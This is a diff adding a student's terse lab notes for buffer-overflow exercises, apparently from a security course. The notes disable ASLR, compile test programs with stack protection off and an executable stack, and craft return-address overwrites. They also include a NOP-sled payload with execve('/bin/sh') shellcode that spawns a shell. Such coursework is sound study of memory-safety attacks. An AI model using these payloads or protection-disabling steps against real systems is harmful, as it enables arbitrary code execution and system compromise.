@@ -1,0 +1,77 @@
+###### Disable ASLR ######
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+
+Exercise 4)
+
+gcc -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -ggdb -o example2_korbi example2.c
+
+gdb: run <<< $(python -c "print('A'*20 + '\x30\x40\x20\x10')")
+echo $(python -c "print(20*'A'+'\x30\x40\x20\x10')") | ./example2_korbi
+
+
+
+Exercise 5)
+
+gcc -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -ggdb -o example3_korbi example3.c
+
+sudo echo $(python -c "print('A'*256+'\x00\x84\x04\x08')") > malicious_input_test
+
+./example3_korbi | cat Exercise5/malicious_input_test | id
+
+
+Exercise 6)
+
+gcc -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -ggdb -o example4_korbi example4.c
+
+cat commented_assembler_code
+
+cat shellspawn.asm
+
+nasm shellspawn.asm -o shellspawn.o -f elf
+
+ld -o shellspawn shellspawn.o -m elf_i386
+
+./convert_to_hex shellspawn
+
+cat shellcode_with_hex.c
+
+./shellcode_with_hex
+
+disas main
+break * 
+
+run $(python -c "print('A'*256)")
+x/100x $esp
+
+copy address
+
+run $(python -c "print('A'*264)")
+
+run $(python -c "print('\x90'*213 + '\xeb\x18\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x8d\x4e\x08\x89\x46\x0c\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42' +'\x80\xec\xff\xbf')")
+
+outside of gdb does not work as gdb has its own environment
+
+./fixenv/r.sh gdb ./example4_korbi
+disas main
+break*
+run $(python -c "print('A'*256)")
+
+x/100x $esp 
+
+run $(python -c "print('\x90'*213 + '\xeb\x18\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x8d\x4e\x08\x89\x46\x0c\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42' +'\x21\xed\xff\xbf')")
+
+echo $(python -c "print('\x90'*213 + '\xeb\x18\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x8d\x4e\x08\x89\x46\x0c\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42' +'\x21\xed\xff\xbf')") > malicious
+
+./../example4_korbi $(cat malicious)
+
+
+
+Exercise 7)
+
+gcc -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -ggdb -o example5_korbi example5.c
+
+./example5_korbi 65536 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+
+gcc -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -ggdb -o example5_fixed_korbi example5_fixed.c
+
